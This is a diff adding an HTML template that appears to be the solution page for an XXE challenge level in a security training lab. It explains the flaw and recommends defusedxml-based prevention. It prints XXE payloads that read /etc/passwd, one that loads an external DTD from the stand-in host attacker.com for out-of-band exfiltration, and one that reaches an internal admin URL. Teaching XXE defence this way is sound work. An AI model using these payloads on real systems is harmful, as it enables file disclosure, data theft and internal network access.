@@ -1,0 +1,117 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: XXE Level 13{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header">
+                <h2 class="text-center"><i class="bi bi-check-circle-fill text-success me-2"></i>Solution: Level 13 - Advanced XXE Exploitation</h2>
+            </div>
+            <div class="card-body solution-content">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This level demonstrates advanced XXE exploitation techniques in modern enterprise environments.
+                    The application processes XML content without proper external entity restrictions, allowing
+                    sophisticated XXE attacks using various techniques and protocols.
+                </p>
+                <p>
+                    The vulnerability exists because the XML processor:
+                </p>
+                <ul>
+                    <li>Processes XML input without disabling external entity resolution</li>
+                    <li>Supports various URL schemes and protocols</li>
+                    <li>Does not implement proper input validation and sanitization</li>
+                    <li>Returns processed content that may include external entity data</li>
+                </ul>
+                
+                <h3>Solution</h3>
+                <p>To solve this challenge, you need to craft an advanced XXE payload that exploits the specific vulnerability:</p>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Advanced XXE Payload</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;\!DOCTYPE data [
+    &lt;\!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;
+    &lt;item&gt;
+        &lt;name&gt;XXE Attack&lt;/name&gt;
+        &lt;value&gt;&amp;xxe;&lt;/value&gt;
+    &lt;/item&gt;
+&lt;/data&gt;</code></pre>
+                
+                <h4>Advanced Techniques:</h4>
+                <ol>
+                    <li><strong>Parameter Entities:</strong> Use parameter entities for more sophisticated attacks</li>
+                    <li><strong>Out-of-Band Exfiltration:</strong> Use external DTDs for data exfiltration</li>
+                    <li><strong>Protocol Exploitation:</strong> Leverage different URL schemes (file://, http://, ftp://)</li>
+                    <li><strong>Error-Based Disclosure:</strong> Use XML parsing errors to disclose information</li>
+                    <li><strong>Blind XXE Techniques:</strong> Exploit XXE without direct output visibility</li>
+                </ol>
+                
+                <h3>Alternative Payloads</h3>
+                <p>Depending on the specific vulnerability context, you may need different approaches:</p>
+                <pre><code>&lt;\!-- Parameter Entity Approach --&gt;
+&lt;\!DOCTYPE data [
+    &lt;\!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+    &lt;\!ENTITY % eval "&lt;\!ENTITY xxe '%file;'&gt;"&gt;
+    %eval;
+]&gt;
+
+&lt;\!-- Out-of-Band with External DTD --&gt;
+&lt;\!DOCTYPE data SYSTEM "http://attacker.com/malicious.dtd"&gt;
+
+&lt;\!-- Multi-Protocol Exploitation --&gt;
+&lt;\!ENTITY xxe SYSTEM "http://internal.server/admin"&gt;</code></pre>
+                
+                <h3>Real-world Impact</h3>
+                <p>
+                    Advanced XXE vulnerabilities can lead to:
+                </p>
+                <ul>
+                    <li>Complete server compromise through file system access</li>
+                    <li>Internal network reconnaissance and lateral movement</li>
+                    <li>Data exfiltration through out-of-band channels</li>
+                    <li>Denial of Service through entity expansion attacks</li>
+                    <li>Integration with other attack vectors (SSRF, RCE)</li>
+                    <li>Bypass of security controls and monitoring systems</li>
+                </ul>
+                
+                <h3>Prevention</h3>
+                <p>To prevent advanced XXE vulnerabilities:</p>
+                <ul>
+                    <li>Completely disable external entity processing</li>
+                    <li>Use secure XML parsing libraries (defusedxml, etc.)</li>
+                    <li>Implement comprehensive input validation</li>
+                    <li>Use XML schema validation with strict rules</li>
+                    <li>Deploy network-level protections and monitoring</li>
+                    <li>Implement proper logging and anomaly detection</li>
+                    <li>Use Content Security Policies where applicable</li>
+                </ul>
+                
+                <h4>Comprehensive Security Configuration:</h4>
+                <pre><code># Python - Secure XML Processing
+from defusedxml import ElementTree as DefusedET
+from defusedxml.common import EntitiesForbidden
+
+try:
+    # Completely disable entity processing
+    tree = DefusedET.parse(xml_input, forbid_entities=True)
+    root = tree.getroot()
+except EntitiesForbidden:
+    # Handle entity attempt
+    logger.security_alert("XXE attempt blocked")
+    return error_response("Invalid XML format")</code></pre>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xxe_level13') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
